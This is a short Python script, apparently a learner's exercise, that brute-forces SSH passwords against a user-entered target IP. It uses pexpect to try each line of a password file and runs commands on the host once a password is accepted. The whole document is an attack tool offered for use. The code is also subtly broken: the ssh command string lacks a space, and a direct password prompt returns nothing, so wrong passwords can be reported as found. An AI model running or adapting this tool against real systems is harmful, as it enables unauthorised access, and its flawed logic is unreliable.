import pexpect
from termcolor import colored

PROMPT = ['#', '>>>', '>', '\$']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)



def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    connStr = 'ssh' + user + '@' +host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: ' ])
    if ret == 0:
        print("[-] Error connecting")
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print("[-] Error Connecting")
            return
        child.sendline(password)
        child.expect(PROMPT, timeout=0.5) #we have to add timeout bcz bruteforcing was so fast so it don't have any time

        return child #child means our SSH connection


def main():
    host = input("Enter IP address of target to bruteforce: ")
    user = input("Enter user account you want to bruteforce: ")
    #add password.txt in the folder from internet which will contain the passwords to bruteforce
    file = open('passwords.txt', 'r') #this will open the file in reading mode
    for password in file.readlines(): #this looop will read every passsword in the file line by line
        password = password.strip('\n') #as new line was added it was considering wrong pass so we striped it
        try:
            child = connect(user, host, password)
            print(colored("[+] Password Found: "+password, 'green'))
            send_command(child, 'whoami') #enter the commands to run on target
        except:
            print(colored("[-] Wrong Passswords "+password, 'red'))
    
main()


